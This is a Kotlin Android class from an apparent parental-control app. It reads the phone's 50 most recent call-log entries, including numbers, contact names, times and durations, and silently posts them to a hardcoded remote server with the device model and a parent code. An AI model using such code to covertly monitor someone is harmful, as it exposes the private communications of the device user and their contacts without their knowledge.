package com.parentcontrol.app

import android.content.Context
import android.provider.CallLog
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject

class CallLogReader(private val context: Context) {

    private val SERVER_URL = "https://overflowing-perception-production-17b2.up.railway.app/calls"
    private val DEVICE_NAME = android.os.Build.MODEL
    private val parentCode: String
        get() {
            val prefs = context.getSharedPreferences("parent_control", Context.MODE_PRIVATE)
            return prefs.getString("parent_code", "") ?: ""
        }

    fun readAndSend() {
        Thread {
            try {
                val callList = JSONArray()
                val cursor = context.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME),
                    null, null, "${CallLog.Calls.DATE} DESC LIMIT 50"
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        val type = when (it.getInt(1)) {
                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            CallLog.Calls.MISSED_TYPE -> "Missed"
                            else -> "Unknown"
                        }
                        callList.put(JSONObject().apply {
                            put("number", it.getString(0) ?: "Unknown")
                            put("type", type)
                            put("time", it.getLong(2))
                            put("duration", it.getInt(3))
                            put("name", it.getString(4) ?: "")
                        })
                    }
                }
                val json = JSONObject().apply {
                    put("device", DEVICE_NAME)
                    put("calls", callList)
                    put("code", parentCode)
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                OkHttpClient().newCall(
                    Request.Builder().url(SERVER_URL).post(body).build()
                ).execute()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }
}
